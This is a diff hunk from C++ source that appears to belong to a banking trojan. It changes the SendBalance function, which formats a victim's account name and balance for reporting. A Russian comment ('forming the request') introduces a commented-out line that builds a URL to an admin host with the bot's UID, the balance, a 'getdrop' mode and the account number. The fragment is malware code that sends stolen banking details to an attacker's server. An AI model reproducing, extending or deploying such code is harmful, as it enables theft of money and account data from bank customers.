@@ -247,7 +247,7 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 		char* nameClient = WSTR::ToAnsi( ia->name, 0 );
 		char* urlNameClient = URLEncode(nameClient);
 		char balance[16];
-		pwsprintfA( balance, "%d.%d", int(ia->balance / 10000), int((ia->balance % 10000)) / 100 );
+		pwsprintfA( balance, "%d.%d", int(ia->balance >> 16), int((ia->balance & 0xffff)) / 100 );
 		//формируем запрос
 		string azUser = GetAzUser();
 		//pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=getdrop&sum=%s&acc=%s", urlAdmin, Bot->UID.t_str(), azUser.t_str(), balance, account );
